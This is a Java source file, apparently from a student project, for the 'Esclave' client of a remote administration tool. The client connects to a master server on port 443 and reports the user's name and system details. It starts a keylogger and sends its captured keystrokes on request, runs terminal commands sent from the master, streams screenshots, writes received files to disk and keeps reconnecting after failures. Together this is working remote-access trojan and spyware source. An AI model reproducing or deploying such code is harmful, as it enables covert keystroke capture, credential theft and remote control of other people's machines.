package client;

import java.awt.AWTException;
import java.awt.Robot;
import java.awt.image.BufferedImage;
import java.io.BufferedInputStream;
import java.io.IOException;
import java.io.ObjectInputStream;
import java.io.ObjectOutputStream;
import java.net.InetAddress;
import java.net.Socket;
import java.nio.file.Paths;

import javax.imageio.ImageIO;

import remote.action.ActionVNC;
import remote.action.Keylogging;
import remote.action.Notification;
import remote.action.ScreenShot;
import remote.action.Terminal;
import send.specific.object.ReceivedSpecificObject;
import send.specific.object.SendSpecificObject;
import constante.Constante;

/**
 * Gestion et coordination des différentes fonctionnalités de l'esclave
 * 
 * @author Clement Collet & Louis Henri Franc & Mohammed Boukhari
 *
 */

public class Esclave
{

	// Parametres :
	// =====================================================================

	private InetAddress			m_addresse;
	private final String			m_addresseMaitre	=  InetAddress.getLocalHost().getHostName(); 															// Addresse IP de la machine distante

	private ObjectInputStream	_in;											// Flux d'entree
	private Keylogging			m_keylogger;

	private ObjectOutputStream	m_out;										// Flux de sortie

	private final int				m_portMaitre		= 443;				// Port de la machine distante
	private Robot					m_robot;
	private Socket					m_socket;

	private Terminal				_terminal			= null;

	
	
	// Main :
	// =====================================================================

	/**
	 * Main de l'esclave
	 * 
	 * @param args
	 * @throws ClassNotFoundException
	 * @throws IOException
	 * @throws InterruptedException
	 * @throws AWTException
	 */
	public static void main(String[] args) throws ClassNotFoundException,
			IOException, InterruptedException, AWTException
	{
		new Esclave();
	}

	// Constructeur :
	// =====================================================================

	public Esclave() throws ClassNotFoundException, InterruptedException,
			IOException, AWTException
	{

		connect();
	}

	// Methodes :
	// =====================================================================

	/**
	 * Methode principal de l'esclave, tente de se connecter au serveur maitre
	 * et tente de déployer tous les objets
	 * 
	 * @return boolean vrai si tout s'est bien passé
	 * @throws IOException
	 * @throws AWTException
	 * @throws ClassNotFoundException
	 * @throws InterruptedException
	 */
	private boolean connect() throws IOException, AWTException,
			ClassNotFoundException, InterruptedException
	{
		try
		{

			m_socket = new Socket(m_addresseMaitre, m_portMaitre);
			m_out = new ObjectOutputStream(m_socket.getOutputStream());
			_in = new ObjectInputStream(new BufferedInputStream(
					m_socket.getInputStream()));
			m_addresse = m_socket.getInetAddress();
			String fileseparator = System.getProperty("file.separator"), username = System // Initialise
																													// les
																													// proprietes
					.getProperty("user.name"), os_version = System 									// du système
																													// esclave
					.getProperty("os.version"), os_name = System
					.getProperty("os.name"), os_arch = System.getProperty("os.arch"), user_country = System
					.getProperty("user.country");

			m_out.writeObject(m_addresse + "++" + fileseparator + "++"
					+ username 																			// Envoi les proprietes au Maitre
					+ "++" + os_version + "++" + os_name + "++" + os_arch + "++"
					+ user_country);

			m_out.flush();
		}
		catch (Exception e)
		{
			return false;
		}
		m_keylogger = new Keylogging(); 															// Appelle le constructeur d'un nouveau
																											// keylogger
		m_robot = new Robot(); 																		// Instancie un robot
		this.receive(this); 																			// Instancie la reception des donnees
		return true;
	}

	/**
	 * Le flux de sortie du socket
	 * @return le flux du socket
	 */
	public ObjectOutputStream getOut()
	{
		return m_out;
	}

	/**
	 * Fonction qui prend en charge les flux de données entre le maitre et
	 * l'esclave
	 * 
	 * @param esclave
	 * @throws ClassNotFoundException
	 * @throws IOException
	 * @throws InterruptedException
	 */
	public void receive(final Esclave esclave) throws ClassNotFoundException,
			IOException, InterruptedException
	{
		Thread recevoir = new Thread("Receive")
		{
			@Override
			public void run()
			{
				Object action;
				try
				{
					while (true)
					{

						action = _in.readObject();									 // Recupere les objets du
																							// socket
						if (action instanceof Integer) 							// Gere les differents
																							// objets recus
																							// En utilisant des
																							// codes
						{
							Integer code = (Integer) action;
							if (code.equals(Constante.code_keylog)) 			// Code pour
																							// recuperer
																							// un
																							// fichier
																							// avec la
																							// saisie
							{
								sendfileKeylog();

							}
							else if (code.equals(Constante.code_notif)) 		// Code
																							// pour
																							// afficher
																							// une
																							// notification
							{
								Object string = _in.readObject();
								if (string instanceof String)
								{
									Notification notif = new Notification(
											(String) string);

								}
							}
							else if (code.equals(Constante.code_cmd)) 		// Code
																							// pour
																							// lancer
																							// une
																							// commande
																							// terminal
							{
								// System.out.println("[debug] Nouveau requete CMD: ");

								if (_terminal == null)
								{
									_terminal = new Terminal();
								}
								action = _in.readObject();
								if (action instanceof String) 					// Recupere
																							// l'instruction
								{
									String instruction = (String) action;
									String res = "";
									res = _terminal.nouvellecommande(instruction,
											esclave);

									if (!res.equals(Constante.code_message_cmd)) // Renvoit
																								// l'instruction
									{
										m_out.writeObject(Constante.code_cmd);
										m_out.flush();
										m_out.writeObject(res);
										m_out.flush();
									}
								}
							}
							else
							{

								ReceivedSpecificObject.receivedFileInDirectory(
										(Integer) action,
													_in,								// Enregistre le fichier
																						// dans le dossier
																						// courant
										(_terminal == null) ? 					// de
																						// l'executable
																						// ou
																						// Dans le dossier courant
																						// correspondant au dossier
																						// du CMD

										Paths.get("").toAbsolutePath().toString()
												+ System.getProperty("file.separator")
												: _terminal.getDirectory()
														+ System
																.getProperty("file.separator"));
							}
						}
						else if (action instanceof ActionVNC) // Reception
						// d'une requete
						// pour VNC
						{
							ActionVNC remoteaction = (ActionVNC) action;

							if (remoteaction instanceof ScreenShot)
							{
								
								ScreenShot screenshot = (ScreenShot) remoteaction;
								BufferedImage result = screenshot.executer(m_robot);

								if (result != null)
								{
											m_out.writeObject(Constante.code_vnc);
									m_out.flush();

									try
									{
										ImageIO.write(result, "PNG",
												m_socket.getOutputStream());
									}
									catch (IndexOutOfBoundsException e)
									{
									}
									m_out.flush();
									m_out.reset();
								}
							}
							else
							{
								Object result = remoteaction.executer(m_robot);

							}

						}
					}

				}
				catch (ClassNotFoundException | IOException | AWTException
						| InterruptedException e1)
				{
					try
					{
						while (!connect())
						{

							Thread.sleep(2000); // Fait une pause de 10 sec
							// avant de se reconnecter

						}
					}
					catch (InterruptedException | ClassNotFoundException
							| IOException | AWTException e2)
					{
						// TODO Auto-generated catch block
					}
				}
			}
		};
		recevoir.start();
	}

	/**
	 * Envoyer le fichier de Keylog au Maitre et relancer un nouveau keylogger
	 * 
	 * @throws IOException
	 * @throws InterruptedException
	 */
	public void sendfileKeylog() throws IOException, InterruptedException
	{
		String chemin = m_keylogger.getCheminFile();
		m_keylogger.arreteKeylog();
		SendSpecificObject.sendTxt("keylogger", chemin, m_out);
		m_keylogger.relancerKeylog();
	}

		
	
}
